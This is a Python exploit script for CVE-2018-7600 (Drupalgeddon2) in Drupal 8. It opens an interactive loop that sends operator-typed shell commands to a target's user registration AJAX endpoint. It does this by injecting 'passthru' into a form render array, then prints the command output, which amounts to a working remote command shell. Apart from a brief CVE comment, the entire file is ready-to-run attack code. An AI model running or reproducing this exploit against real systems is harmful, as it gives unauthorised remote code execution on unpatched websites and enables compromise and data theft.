#!/usr/bin/env python3

# AJ2K
# CVE : CVE-2018-7600
# This script is only working on version 8, not 7.
# ~ Drupal 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. ~ #

import requests, argparse

def MakeRequest(url, headers, data):
	if args.proxy:
		proxies = {
			'http': args.proxy,
			'https': args.proxy
		}
		r = requests.post(url, headers=headers, data=data, proxies=proxies)
	else:
		r = requests.post(url, headers=headers, data=data)
	output = r.text.splitlines()
	output = output[:-1]
	for x in output:
		print(x)

parser = argparse.ArgumentParser(description='Args')
requiredNamed = parser.add_argument_group('Required Arguments')
parser.add_argument("-u", dest="rhost", help="The host to exploit. Eg: http://192.168.1.5:80", required=True)
parser.add_argument("-p", dest="proxy", help="protocol:host:port Eg: http://127.0.0.1:8080")
args = parser.parse_args()

url = args.rhost+"/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "User-Agent": "Python", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}

while True:
	cmd = input("CMD: ")
	data = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[a][#post_render][]": "passthru", "mail[a][#type]": "markup", "mail[a][#markup]": cmd}
	MakeRequest(url, headers, data)